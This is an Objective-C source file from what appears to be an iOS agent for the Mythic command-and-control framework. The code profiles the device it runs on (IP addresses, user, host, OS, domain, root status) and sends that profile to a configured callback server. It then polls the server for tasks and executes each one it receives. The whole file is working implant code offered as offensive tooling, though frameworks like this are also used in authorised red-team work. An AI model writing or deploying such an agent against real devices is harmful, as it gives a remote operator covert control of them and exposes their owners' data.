#import <Foundation/Foundation.h>
#include <complex.h>
#import "HTTPC2Config.h"
#import "SystemInfoHelper.h"
#import "C2CheckIn.h"
#import "C2Task.h"


@implementation C2CheckIn

NSString *callbackUUID = nil;

+ (void)performPlaintextCheckin {
    /// C2 configuration from HTTPC2Config
    NSString *callbackHost = [HTTPC2Config callbackHost];
    NSInteger callbackPort = [HTTPC2Config callbackPort];
    NSDictionary *headers = [HTTPC2Config headers];
    NSString *postURI = @"agent_message";
    NSString *payloadUUID = [HTTPC2Config payloadUUID];

    NSLog(@"[DEBUG] Callback Host: %@", callbackHost);
    NSLog(@"[DEBUG] Callback Port: %ld", (long)callbackPort);
    NSLog(@"[DEBUG] Post URI: %@", postURI);

    /// The check-in endpoint: `http://<callbackHost>:<callbackPort>/agent_message`
    NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
    NSURL *url = [NSURL URLWithString:urlString];
    NSLog(@"[DEBUG] Check-in URL: %@", url);

    /// Get the system info
    NSString *internalIP = [SystemInfoHelper getInternalIPAddress];
    NSInteger pid = [SystemInfoHelper getPID];
    NSString *user = [SystemInfoHelper getUser];
    NSString *host = [SystemInfoHelper getHost];
    NSString *os = [SystemInfoHelper getOS];
    NSString *arch = [SystemInfoHelper getArchitecture];
    NSString *domain = [SystemInfoHelper getDomain];
    NSString *externalIP = [SystemInfoHelper getExternalIPAddress];
    /// Check if running as root for the integrity level
    /// https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/initial-checkin
    int integrityLevel = getuid() == 0 ? 4 : 2;

    /// Construct the check-in JSON we'll send to Mythic
    NSDictionary *checkinData = @{
        @"action": @"checkin",
        @"uuid": payloadUUID,
        @"ips": @[internalIP],
        @"os": os,
        @"user": user,
        @"host": host,
        @"pid": @(pid),
        @"architecture": @"arm64",
        @"domain": domain,
        @"external_ip": externalIP,
        @"integrity_level": @(integrityLevel),
        @"process_name": @"aura"
    };

    /// Log what we're going to check-in
    NSLog(@"# 👋 Hello from the Aura iOS agent!\n%@\n\n", checkinData);

    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:checkinData options:0 error:&jsonError];
    if (jsonError) {
        NSLog(@"[ERROR] Error creating JSON: %@", jsonError.localizedDescription);
        return;
    }

    /// Concatenate the UUID and JSON data and base64 encode per Mythic docs
    NSMutableData *messageData = [[payloadUUID dataUsingEncoding:NSUTF8StringEncoding] mutableCopy];
    [messageData appendData:jsonData];
    NSString *base64CheckinMessage = [messageData base64EncodedStringWithOptions:0];
    NSLog(@"[DEBUG] Base64 Check-in Message: %@", base64CheckinMessage);

    /// Perform the check-in request via `POST`
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:[base64CheckinMessage dataUsingEncoding:NSUTF8StringEncoding]];
    [request addValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    /// Add in HTTP headers from configuration
    for (NSString *key in headers) {
        [request addValue:headers[key] forHTTPHeaderField:key];
        NSLog(@"[DEBUG] Adding header: %@ = %@", key, headers[key]);
    }

    NSURLSession *session = [NSURLSession sharedSession];
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);

    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ERROR] Error during check-in: %@", error.localizedDescription);
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            if (httpResponse.statusCode == 200) {
                NSLog(@"[DEBUG] Successfully checked in to C2.");
                if (data) {
                    NSString *responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                    NSLog(@"[DEBUG] Received response: %@", responseString);

                    if ([responseString length] > 36) {
                        NSLog(@"[DEBUG] Full response string (Base64): %@", responseString);
                        
                        /// Decode the b64 response string
                        NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
                        if (decodedData == nil) {
                            NSLog(@"[ERROR] Failed to decode base64 response.");
                            return;
                        }

                        /// Convert the decoded data back to a string
                        NSString *decodedResponseString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
                        NSLog(@"[DEBUG] Decoded response string: %@", decodedResponseString);

                        /// Locate the start of the JSON part -- per Mythic docs
                        /// https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/agent-message-format
                        NSRange jsonRange = [decodedResponseString rangeOfString:@"{"];
                        if (jsonRange.location != NSNotFound) {
                            NSLog(@"[DEBUG] Found '{' at index: %lu", (unsigned long)jsonRange.location);

                            // Extract the JSON part from the decoded response
                            NSString *responseWithoutUUID = [decodedResponseString substringFromIndex:jsonRange.location];
                            NSLog(@"[DEBUG] Extracted JSON string: %@", responseWithoutUUID);

                            NSData *jsonData = [responseWithoutUUID dataUsingEncoding:NSUTF8StringEncoding];
                            NSError *jsonError;
                            NSDictionary *jsonResponse = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&jsonError];

                            if (jsonError) {
                                NSLog(@"[ERROR] Failed to parse JSON: %@", jsonError.localizedDescription);
                                NSLog(@"[DEBUG] Raw responseWithoutUUID: %@", responseWithoutUUID);
                            } else {
                                NSLog(@"[DEBUG] Parsed JSON: %@", jsonResponse);
                                if (jsonResponse[@"id"]) {
                                    callbackUUID = jsonResponse[@"id"];  // Save the Callback UUID
                                    NSLog(@"[DEBUG] New Callback UUID: %@", callbackUUID);
                                } else {
                                    NSLog(@"[ERROR] No 'id' key found in the JSON.");
                                }
                            }
                        } else {
                            NSLog(@"[ERROR] Could not find '{' in the decoded response. Full decoded response: %@", decodedResponseString);
                        }
                    } else {
                        NSLog(@"[ERROR] Response is too short. Full response: %@", responseString);
                    }
                }
            } else {
                NSLog(@"[ERROR] Failed to check in. HTTP Status Code: %ld", (long)httpResponse.statusCode);
            }
        }
        dispatch_semaphore_signal(sema);
    }];

    [task resume];
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
}

+ (void)processTasksFromResponse:(NSDictionary *)taskingResponse {
    NSArray *tasksArray = taskingResponse[@"tasks"];
    
    NSMutableArray<C2Task *> *tasks = [NSMutableArray array];
    
    for (NSDictionary *taskDict in tasksArray) {
        C2Task *task = [[C2Task alloc] initWithDictionary:taskDict];
        [tasks addObject:task];
    }

    // Process each task asynchronously
    for (C2Task *task in tasks) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [task executeTask];
        });
    }
}


+ (void)getTasking {
    // Ensure we have the callbackUUID to use
    if (callbackUUID == nil) {
        NSLog(@"[ERROR] No callback UUID available for tasking. Did you perform check-in?");
        return;
    }

    // Gather C2 configuration from HTTPC2Config
    NSString *callbackHost = [HTTPC2Config callbackHost];
    NSInteger callbackPort = [HTTPC2Config callbackPort];
    NSDictionary *headers = [HTTPC2Config headers];
    NSString *postURI = @"agent_message";

    // Create the URL for get_tasking
    NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
    NSURL *url = [NSURL URLWithString:urlString];
    NSLog(@"[DEBUG] Get Tasking URL: %@", url);

    // Construct the get_tasking JSON data
    NSDictionary *taskingData = @{
        @"action": @"get_tasking",
        @"tasking_size": @1,
        @"uuid": callbackUUID
    };

    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:taskingData options:0 error:&jsonError];
    if (jsonError) {
        NSLog(@"[ERROR] Error creating JSON: %@", jsonError.localizedDescription);
        return;
    }

    // Concatenate the UUID and JSON data and base64 encode
    NSMutableData *messageData = [[callbackUUID dataUsingEncoding:NSUTF8StringEncoding] mutableCopy];
    [messageData appendData:jsonData];
    NSString *base64TaskingMessage = [messageData base64EncodedStringWithOptions:0];

    // Debug logging for base64 tasking message
    NSLog(@"[DEBUG] Base64 Tasking Message: %@", base64TaskingMessage);

    // Perform the tasking request
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:[base64TaskingMessage dataUsingEncoding:NSUTF8StringEncoding]];
    [request addValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

    // Add headers from configuration
    for (NSString *key in headers) {
        [request addValue:headers[key] forHTTPHeaderField:key];
        // NSLog(@"[DEBUG] Adding header: %@ = %@", key, headers[key]);
    }

    NSURLSession *session = [NSURLSession sharedSession];
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);

    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ERROR] ❌ Error during get_tasking: %@", error.localizedDescription);
        } else {
            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
            if (httpResponse.statusCode == 200) {
                if (data) {
                    NSString *responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                    NSLog(@"[DEBUG] Received tasking (Base64): %@", responseString);

                    // Decode the Base64 response
                    NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
                    if (!decodedData) {
                        NSLog(@"[ERROR] ❌ Failed to decode Base64 tasking response.");
                        return;
                    }

                    // Extract JSON from decoded data (removing UUID prefix)
                    NSString *decodedString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
                    NSLog(@"[DEBUG] Decoded response string: %@", decodedString);

                    // Find where the JSON starts (after UUID)
                    NSRange jsonRange = [decodedString rangeOfString:@"{"];
                    if (jsonRange.location != NSNotFound) {
                        NSString *jsonString = [decodedString substringFromIndex:jsonRange.location];
                        // NSLog(@"[DEBUG] Extracted JSON string: %@", jsonString);

                        // Parse the JSON string
                        NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
                        NSDictionary *taskingResponse = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];

                        if (taskingResponse) {
                            // NSLog(@"[DEBUG] Parsed JSON: %@", taskingResponse);
                            // Handle the parsed tasking response here, e.g., extract tasks, actions, etc.
                            NSString *action = taskingResponse[@"action"];
                            NSArray *tasks = taskingResponse[@"tasks"];
                            if ([action isEqualToString:@"get_tasking"] && tasks.count > 0) {
                                NSArray *tasksArray = taskingResponse[@"tasks"];
                                NSLog(@"[DEBUG] 📋 Tasks received: %@", tasksArray);
                                [self processTasksFromResponse:taskingResponse];
                            } else {
                                NSLog(@"[DEBUG] ⌚️ Waiting on tasking...");
                            }
                        } else {
                            NSLog(@"[ERROR] Failed to parse JSON from decoded tasking response.");
                        }
                    } else {
                        NSLog(@"[ERROR] Failed to locate JSON within the decoded string.");
                    }
                }
            } else {
                NSLog(@"[ERROR] Failed to fetch tasking. HTTP Status Code: %ld", (long)httpResponse.statusCode);
            }
        }
        dispatch_semaphore_signal(sema);
    }];

    [task resume];
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
}


@end